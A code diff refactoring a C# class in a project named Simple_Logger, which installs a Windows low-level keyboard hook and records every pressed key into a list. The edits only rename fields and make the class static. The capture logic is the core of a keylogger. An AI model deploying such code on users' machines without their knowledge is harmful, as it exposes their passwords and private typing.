@@ -6,18 +6,18 @@ using System.Windows.Forms;
 
 namespace Simple_Logger
 {
-    public class Hook
+    public static class Hook
     {
         // Variable definitions
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
-        public static IntPtr _hookId = IntPtr.Zero;
+        public static IntPtr HookId = IntPtr.Zero;
 
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        public static LowLevelKeyboardProc Proc = HookCallback;
+        public static readonly LowLevelKeyboardProc Proc = HookCallback;
 
         // Used to convert virtual key codes to readable strings
 
@@ -60,7 +60,7 @@ namespace Simple_Logger
                 Logger.Keys.Add(Converter.ConvertToString(vkCode)?.ToLower());
             }
 
-            return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            return CallNextHookEx(HookId, nCode, wParam, lParam);
         }
     }
 }
